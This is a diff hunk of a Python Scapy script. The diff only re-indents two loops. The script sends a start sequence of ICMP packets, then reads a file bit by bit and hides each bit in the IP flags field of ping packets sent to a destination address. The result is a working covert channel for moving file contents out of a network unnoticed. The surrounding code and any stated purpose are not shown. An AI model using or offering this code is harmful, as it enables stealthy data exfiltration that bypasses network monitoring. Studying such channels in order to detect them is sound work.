@@ -87,23 +87,23 @@ def main(argv):
 
 print (bcolors.OKGREEN + "Sending start packet.")
 
-	for x in range (0,16):
+for x in range (0,16):
 	payload = "abcdefghijklmnopqrstuvwabcdefgs"
-		ip = IP(dst=begin, proto=1, id=12345, flags=x, frag=1)
-		icmp = ICMP(type=8, code=0)
-		packet = ip/icmp/payload
-		send(packet,verbose=0)
+	ip = IP(dst=begin, proto=1, id=12345, flags=x, frag=1)
+	icmp = ICMP(type=8, code=0)
+	packet = ip/icmp/payload
+	send(packet,verbose=0)
 
 print (bcolors.OKBLUE + "\tSending data. Total packets: " +  str(os.path.getsize(file) * 8))
 
 #if true:
 for b in bits(open(file, 'r')):
 #print b
-		payload = "abcdefghijklmnopqrstuvwabcdefg"
-		ip = IP(dst=destip, proto=1, id=12345, flags=b)
-		icmp = ICMP(type=8, code=0)
-		packet = ip/icmp/payload
-		send(packet, verbose=0)
+	payload = "abcdefghijklmnopqrstuvwabcdefg"
+	ip = IP(dst=destip, proto=1, id=12345, flags=b)
+	icmp = ICMP(type=8, code=0)
+	packet = ip/icmp/payload
+	send(packet, verbose=0)
 #else:
 
 print (bcolors.OKGREEN + "Sending end packet.")
